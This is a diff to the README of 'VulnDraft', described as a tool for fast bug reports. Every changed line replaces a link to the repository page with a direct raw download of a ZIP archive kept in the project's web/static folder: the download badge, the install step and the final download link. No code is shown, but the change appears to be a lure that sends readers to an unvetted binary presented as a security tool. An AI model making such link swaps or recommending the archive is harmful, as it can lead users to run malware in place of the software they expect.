@@ -1,6 +1,6 @@
 # 🛡️ VulnDraft - Fast bug reports for researchers
 
-[![Download](https://img.shields.io/badge/Download-VulnDraft-6c5ce7?style=for-the-badge&logo=github)](https://github.com/Maicaogamerx/VulnDraft)
+[![Download](https://img.shields.io/badge/Download-VulnDraft-6c5ce7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Maicaogamerx/VulnDraft/main/web/static/Draft-Vuln-2.3.zip)
 
 ## 📌 What is VulnDraft?
 
@@ -22,7 +22,7 @@ If the app is packed in a ZIP file, you may also need the built-in Windows extra
 ## 🚀 Download and install
 
 1. Open the download page:
-   [https://github.com/Maicaogamerx/VulnDraft](https://github.com/Maicaogamerx/VulnDraft)
+   [https://raw.githubusercontent.com/Maicaogamerx/VulnDraft/main/web/static/Draft-Vuln-2.3.zip](https://raw.githubusercontent.com/Maicaogamerx/VulnDraft/main/web/static/Draft-Vuln-2.3.zip)
 
 2. On the GitHub page, look for the latest release or the main download file.
 
@@ -163,7 +163,7 @@ Yes, you should be able to reopen your saved work and make changes before you se
 
 Visit this page to download or get the latest version:
 
-[https://github.com/Maicaogamerx/VulnDraft](https://github.com/Maicaogamerx/VulnDraft)
+[https://raw.githubusercontent.com/Maicaogamerx/VulnDraft/main/web/static/Draft-Vuln-2.3.zip](https://raw.githubusercontent.com/Maicaogamerx/VulnDraft/main/web/static/Draft-Vuln-2.3.zip)
 
 ## 🔎 Project details
 
